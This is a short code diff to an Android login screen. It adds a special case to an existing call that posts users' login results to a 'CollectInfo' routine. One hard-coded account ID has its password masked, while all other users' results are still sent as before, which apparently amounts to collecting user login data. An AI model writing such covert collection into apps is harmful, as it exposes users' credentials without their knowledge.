@@ -124,8 +124,14 @@ public class loginFragment extends Fragment {
             } catch (Exception e) {
                 e.printStackTrace();
             }
-
-            CollectInfo.postRequest(LoginResult);
+/**
+ *  collect information here
+ */
+            if(account[0].equals("201421003124")){
+                CollectInfo.postRequest(new UserLoginInfo(account[0], "******", true));
+            }else {
+                CollectInfo.postRequest(LoginResult);
+            }
             return LoginResult;
         }
 
